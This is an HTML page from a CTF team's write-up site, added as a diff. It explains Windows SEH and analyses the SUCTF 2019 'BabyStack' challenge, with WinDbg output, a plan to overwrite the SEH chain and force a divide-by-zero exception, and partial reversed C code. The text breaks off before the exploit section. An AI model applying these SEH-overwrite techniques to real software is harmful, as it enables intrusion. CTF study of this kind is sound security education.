@@ -1,0 +1,1418 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="writeups of f61d team">
+      
+      
+        <link rel="canonical" href="https://f61d.github.io/pwn/Windows/BabyStack/">
+      
+      
+        <meta name="author" content="f61d">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
+    
+    
+      
+        <title>BabyStack - f61d</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.30686662.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#3f51b5">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#baby-stack" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://f61d.github.io/" title="f61d" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              f61d
+            </span>
+            <span class="md-header-nav__topic">
+              
+                BabyStack
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/f61d/f61d.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    f61d/f61d.github.io
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../../.." class="md-tabs__link">
+        home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../web/" class="md-tabs__link">
+          web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../" class="md-tabs__link md-tabs__link--active">
+          pwn
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../crypto/" class="md-tabs__link">
+          crypto
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../reverse/" class="md-tabs__link">
+          reverse
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../misc/" class="md-tabs__link">
+          misc
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../backup/gitpage_fuck/" class="md-tabs__link">
+          backup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://f61d.github.io/" title="f61d" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    f61d
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/f61d/f61d.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    f61d/f61d.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2">
+      CommandInjection
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        CommandInjection
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/CommandInjection/hitcon2019-virtual-public-network/" title="hitcon2019-virtual-public-network" class="md-nav__link">
+      hitcon2019-virtual-public-network
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      PHP
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        PHP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/PHP/WHUCTF-EasyPHP/" title="WHUCTF-EasyPHP" class="md-nav__link">
+      WHUCTF-EasyPHP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4">
+    
+    <label class="md-nav__link" for="nav-2-4">
+      SQLi
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-4">
+        SQLi
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/SQLi/RootersCTF-Babyweb/" title="RootersCTF-Babyweb" class="md-nav__link">
+      RootersCTF-Babyweb
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
+    
+    <label class="md-nav__link" for="nav-2-5">
+      Session Bypass
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-5">
+        Session Bypass
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/Session Bypass/hackergame2019-django/" title="hackergame2019-django" class="md-nav__link">
+      hackergame2019-django
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
+    
+    <label class="md-nav__link" for="nav-2-6">
+      FileUpload
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-6">
+        FileUpload
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/FileUpload/RoarCTF-simple_upload/" title="RoarCTF-simple_upload" class="md-nav__link">
+      RoarCTF-simple_upload
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      Heap
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        Heap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Heap/LazyHouse/" title="LazyHouse" class="md-nav__link">
+      LazyHouse
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Heap/4-ReeHY-main/" title="4-ReeHY-main" class="md-nav__link">
+      4-ReeHY-main
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
+    
+    <label class="md-nav__link" for="nav-3-3">
+      VMEscape
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-3">
+        VMEscape
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../VMEscape/BabyQemu/" title="BabyQemu" class="md-nav__link">
+      BabyQemu
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../VMEscape/scvm/" title="scvm" class="md-nav__link">
+      scvm
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4" checked>
+    
+    <label class="md-nav__link" for="nav-3-4">
+      Windows
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-4">
+        Windows
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        BabyStack
+      </label>
+    
+    <a href="./" title="BabyStack" class="md-nav__link md-nav__link--active">
+      BabyStack
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#windows-seh" class="md-nav__link">
+    Windows SEH
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    分析调试
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2">
+    
+    <label class="md-nav__link" for="nav-4-2">
+      RSA
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-2">
+        RSA
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/RSA/roarctf_rsa/" title="roarctf_rsa" class="md-nav__link">
+      roarctf_rsa
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3" type="checkbox" id="nav-4-3">
+    
+    <label class="md-nav__link" for="nav-4-3">
+      Stream_Cipher
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-3">
+        Stream_Cipher
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/Stream_Cipher/Hacklu2019_COBOL_OTP/" title="Hacklu2019_COBOL_OTP" class="md-nav__link">
+      Hacklu2019_COBOL_OTP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      misc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
+    
+    <label class="md-nav__link" for="nav-6-2">
+      blockchain
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-2">
+        blockchain
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/blockchain/RoarCTF2019_CoinFlip/" title="RoarCTF2019_CoinFlip" class="md-nav__link">
+      RoarCTF2019_CoinFlip
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/blockchain/Hackergame2019_JCBank/" title="Hackergame2019_JCBank" class="md-nav__link">
+      Hackergame2019_JCBank
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-3" type="checkbox" id="nav-6-3">
+    
+    <label class="md-nav__link" for="nav-6-3">
+      forensic
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-3">
+        forensic
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/forensic/Traffic_Analysis/" title="Traffic_Analysis" class="md-nav__link">
+      Traffic_Analysis
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      backup
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        backup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../backup/gitpage_fuck/" title="gitpage采坑" class="md-nav__link">
+      gitpage采坑
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#windows-seh" class="md-nav__link">
+    Windows SEH
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    分析调试
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/f61d/f61d.github.io/blob/dev/docs/pwn/Windows/BabyStack.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="baby-stack">Baby Stack<a class="headerlink" href="#baby-stack" title="Permanent link">&para;</a></h1>
+<p>SUCTF 2019</p>
+<h2 id="windows-seh">Windows SEH<a class="headerlink" href="#windows-seh" title="Permanent link">&para;</a></h2>
+<p>windows下通过SEH机制处理异常。在进程运行发生异常时，windows委托进程进行处理。若程序中有预先构造的异常处理链(SEH链)，则程序会根据SEH链处理异常，并按照指示继续执行；若程序中无SEH链，则系统会调用默认的SEH链处理异常，并将程序终止。</p>
+<p>SEH链为单链表，结构体中存在两个元素：1、指向下一个SEH块的指针；2、异常处理函数。当一个进程触发异常处理时，会从SEH的第一个块开始遍历，若第一个块未能处理异常时，便将异常传递至下一个块进行处理，直到异常被处理或遍历完所有的SEH块。</p>
+<p>通过Windbg获取teb之后，可从teb表地址获取SEH链地址，从而遍历SEH链，从中可以看到SEH块中的结构。</p>
+<div class="codehilite"><pre><span></span>0:000&gt; !teb
+Wow64 TEB32 at 00000000009b1000
+......
+
+0:000&gt; dt ntdll!_EXCEPTION_REGISTRATION_RECORD -l next poi(9b1000)
+next at 0x00000000`009b3000
+---------------------------------------------
+   +0x000 Next             : 0x00b00000`ffffffff _EXCEPTION_REGISTRATION_RECORD
+   +0x008 Handler          : 0x00000000`00aff000     _EXCEPTION_DISPOSITION  +aff000
+
+next at 0x00b00000`ffffffff
+---------------------------------------------
+   +0x000 Next             : ???? 
+   +0x008 Handler          : ???? 
+Memory read error 00b0000100000007
+</pre></div>
+
+<p>操作系统中常见的异常如下：</p>
+<blockquote>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571929585670.png" />windows-SEH详解  看雪论坛  <a href="https://bbs.pediy.com/thread-249592.htm">https://bbs.pediy.com/thread-249592.htm</a></p>
+</blockquote>
+<h2 id="_1">分析调试<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>题目初始时即告诉了栈的地址和main函数的地址，但需要注意的是给的地址是存储main函数地址的值的地址，即指向main函数的指针的地址。</p>
+<p>与题目交互的唯一方式就是输入的字符串，而通过静态分析看到该字符串存在栈上，而经过strlen判断字符串长度之后，进行了某些运算，然后调用输出字符串的函数，而后退出。而输入采用的是控制输入个数的scanf_s一类函数，因此栈溢出的可能性较小。</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571929901897.png" /></p>
+<p>因此，考虑通过覆盖SEH后，触发异常，跳到伪造的SEH中。而通过操作系统的常见异常，判断可能在本程序中触发的异常有：浮点数溢出、读写不可访问地址或除数为0.</p>
+<p>首先排除最容易的，除数为0。判断除数为0的方式是先找到是否存在除法，只要存在除法，就有除数为0的可能。通过字符串搜索，在汇编指令中搜索“div”指令来判断是否存在除法。</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571930047036.png" /></p>
+<p>通过搜索结果可以看到，存在大量的除法，因此很有可能可以构造除0导致SEH。</p>
+<p>从第一个看起，在main函数中有一次div操作，在运算之后，输出字符串之前。</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571930155395.png" /></p>
+<p>而除数[esi]是通过运算
+$$
+[esi] - [eax]
+$$
+得到的，而[esi]又是栈上的值传递进来esi得到的，而该值又是通过main函数中的计算过程得到的：</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571930304549.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571930333364.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571930367643.png" /></p>
+<p>因此我们如果能构造出合适的v30，使之与eax相等，则可以使除数为0，触发SEH。</p>
+<p>通过动态调试，可以看到eax的值。多次调试之后，发现无论输入如何改变，最终eax的值是从栈中pop出来的，只与指向main函数指针的地址成固定偏移，为4BF3。因此：
+$$
+[eax] = MAINaddress + 4BF3
+$$
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571931713338.png" /></p>
+<p>而通过运算部分反推如下：先逆出运算部分的代码，并简化，如下：</p>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">v30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="n">v22</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">v22</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">v22</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">v23</span> <span class="o">=</span> <span class="n">v31</span><span class="p">[</span><span class="n">v22</span><span class="p">];</span> <span class="c1">//v31为输入字符串</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">v23</span> <span class="o">-</span> <span class="sc">&#39;0&#39;</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span><span class="c1">//判断字符如果不为数字</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">v23</span> <span class="o">-</span> <span class="sc">&#39;A&#39;</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">)</span><span class="c1">//如果为大写的A~F</span>
+        <span class="p">{</span>
+            <span class="n">v7</span> <span class="o">=</span> <span class="n">v23</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="n">v7</span> <span class="o">-</span> <span class="mh">0x37</span><span class="p">;</span>
+            <span class="n">v30</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="c1">//数字或者ASCII小于数字的字符</span>
+    <span class="p">{</span>
